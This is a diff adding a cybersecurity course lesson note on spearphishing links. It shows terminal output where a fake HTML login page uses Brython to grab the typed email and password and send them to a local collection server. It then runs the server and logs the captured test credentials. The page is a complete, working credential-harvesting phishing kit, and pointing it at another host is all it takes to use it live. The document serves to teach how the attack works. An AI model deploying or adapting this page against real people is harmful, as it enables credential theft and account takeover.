@@ -1,0 +1,58 @@
+# MALICIOUS LINKS/SPEARPHISHING LINKS LESSON - INFOSEC
+
+  # cd to project folder
+
+~
+❯ cd ~/python-for-cybersecurity/Part_4/4.1_Spearphishing_Links/
+
+~/python-for-cybersecurity/Part_4/4.1_Spearphishing_Links main*
+❯ ls
+.rw-r--r-- 736k nicholas  4 Jul 00:46  brython.js
+.rw-r--r-- 3.7M nicholas  4 Jul 00:46  brython_stdlib.js
+.rw-r--r--  688 nicholas  4 Jul 00:46  example.html
+.rw-r--r--  802 nicholas  4 Jul 00:46  server.py
+
+  # nano example.html
+
+~/python-for-cybersecurity/Part_4/4.1_Spearphishing_Links main*
+❯ nano example.html 
+
+    GNU nano 9.1                                        example.html                                                  
+<!DOCTYPE html>
+<html>
+<head>
+<script src=./brython.js></script>
+<script src=./brython_stdlib.js></script>
+<head>
+<body onLoad="brython(1)">
+<INPUT id="email" value="Email Address">
+<INPUT id="pass" value="Password">
+<button id="submit">Log In</button>
+<script type="text/python3">
+from browser import document,ajax
+host="127.0.0.1"
+port="8443"
+def submitCreds(ev):
+        username=document['email'].value
+        password=document['pass'].value
+        url = "http://"+host+":"+port+"?user="+username+"&password="+password
+        req = ajax.ajax()
+        req.open("GET",url,True)
+        #req.bind("complete",complete)
+        req.send()
+document["submit"].bind("click",submitCreds)
+</script>
+</body>
+</html>
+
+  # launch server in Python
+
+~/python-for-cybersecurity/Part_4/4.1_Spearphishing_Links main*
+❯ python server.py
+Server started http://localhost:8443
+Username: noone@gmail.com, Password: Password!123
+127.0.0.1 - - [19/Jul/2026 00:42:05] "GET /?user=noone@gmail.com&password=Password!123 HTTP/127.0.0.1" 300-
+
+  # LESSON END
+
+
